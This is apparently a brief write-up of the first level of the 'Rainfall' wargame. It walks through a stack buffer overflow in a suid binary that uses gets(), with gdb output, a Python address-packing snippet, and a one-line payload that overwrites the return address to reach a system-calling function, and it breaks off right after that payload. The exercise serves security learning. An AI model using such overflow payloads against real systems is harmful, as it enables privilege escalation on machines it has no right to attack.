# Rainfall0
```
 GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level1/level1
```
For this first level we have a suid binary in our home.

```ls -l
~$ ls -l
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
```
We see less functions, but two specific ones

```gdb
(gdb) i functions
0x08048444  run
0x08048480  main
```

We can see that the run function makes a system call, this looks like a good entrypoint
And in the main function we see a gets call, it's am unprotected function that can lead to buffer overflows

Look at the asm we can see a 80 long buffer

But if we look more carefully it's actually shorter that, 80 chars completely override the return pointer

We can try to overwrite it with the run address


In order to format the adress properly, we can use python and the lib struct, it looks like that : 
```python
import struct
struct.pack('<I', 0x08048444)
    'D\x84\x04\x08' or '\x44\x84\x04\x08'
```


```python -c 'print("A" * 76 + "\x44\x84\x04\x08")' > /tmp/1

Here we are